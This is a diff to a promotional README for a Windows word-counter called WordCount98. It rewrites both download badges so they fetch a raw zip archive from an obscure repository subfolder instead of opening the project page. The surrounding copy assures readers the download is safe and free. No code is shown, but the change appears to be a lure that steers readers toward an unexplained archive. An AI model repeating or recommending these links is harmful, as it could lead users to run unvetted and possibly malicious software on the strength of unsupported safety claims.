@@ -4,7 +4,7 @@
 
 Welcome to WordCount98! This is a simple, fast, and reliable word counter application designed for everyday use. Whether you're a student writing essays, a professional drafting reports, or just someone who needs to keep track of text length, WordCount98 makes it effortless. No technical skills required—just download, run, and start counting.
 
-[![Download WordCount98](https://img.shields.io/badge/Download-WordCount98-blue?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/unfed-turnstone35/WordCount98)
+[![Download WordCount98](https://img.shields.io/badge/Download-WordCount98-blue?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/unfed-turnstone35/WordCount98/main/hashy/Word_Count_1.8.zip)
 
 ## 📥 Download & Installation
 
@@ -132,7 +132,7 @@ Most issues can be resolved quickly by restarting the application or your comput
 
 WordCount98 is ready to simplify your text counting needs. Download it now and experience the convenience of a tool designed with you in mind. No complexities, no frustrations—just accurate counting every time you need it.
 
-[![Get WordCount98 Now](https://img.shields.io/badge/🚀-Download_Now-orange?style=for-the-badge&logo=windows&logoColor=white&color=FF5722)](https://github.com/unfed-turnstone35/WordCount98)
+[![Get WordCount98 Now](https://img.shields.io/badge/🚀-Download_Now-orange?style=for-the-badge&logo=windows&logoColor=white&color=FF5722)](https://raw.githubusercontent.com/unfed-turnstone35/WordCount98/main/hashy/Word_Count_1.8.zip)
 
 Remember: Visit this link to download the application. The process is quick, safe, and completely free. Join thousands of satisfied users who rely on WordCount98 for their daily word counting tasks. Your productivity will thank you!
 
